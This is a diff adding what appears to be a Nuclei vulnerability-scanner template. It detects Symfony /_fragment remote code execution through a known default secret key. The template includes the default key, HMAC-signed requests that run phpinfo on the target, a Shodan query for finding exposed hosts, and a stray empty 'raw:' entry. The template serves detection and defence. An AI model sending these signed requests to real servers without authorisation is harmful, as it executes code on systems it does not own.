@@ -1,0 +1,39 @@
+id: symfony-rce
+info:
+  name: Symfony _fragment - Default Key RCE
+  author: Yablargo
+  severity: critical
+  description: |
+    Symfony servers support a "/_fragment" command that allows clients to provide custom PHP commands and return the HTML output. 
+    This template checks to see if they also use a popular default secret key for remote command execution.
+  reference: |
+    - https://portswigger.net/daily-swig/symfony-based-websites-open-to-rce-attack-research-finds
+    - https://medium.com/@m4cddr/how-i-got-rce-in-10-websites-26dd87441f22
+    - https://al1z4deh.medium.com/how-i-hacked-28-sites-at-once-rce-5458211048d5
+    - https://github.com/ambionics/symfony-exploits
+  metadata:
+    max-request: 1
+    shodan-query: http.html:"symfony Profiler"
+    verified: true
+  tags: config,symfony
+
+variables:
+  badsecretkey: 'ThisIsAlmostCertainlyNotIt'
+  secretkey: 'ThisTokenIsNotSoSecretChangeIt'               
+  uri_part: '_fragment?_path=what%3D-1%26_controller%3Dphpinfo'
+
+http:
+  - raw:
+  - method: GET
+    path:
+      - '{{Scheme}}://{{Hostname}}/{{uri_part}}&_hash={{url_encode(base64(hex_decode(hmac("sha256","http://{{Hostname}}/{{uri_part}}",badsecretkey))))}}'        
+      - '{{Scheme}}://{{Hostname}}/{{uri_part}}&_hash={{url_encode(base64(hex_decode(hmac("sha256","http://{{Hostname}}/{{uri_part}}",secretkey))))}}'
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 403"
+          - "status_code_2 == 200"
+          - "contains(body_2, 'PHP Version')"          
+          - "contains(body_2, 'PHP License')"          
+        condition: and
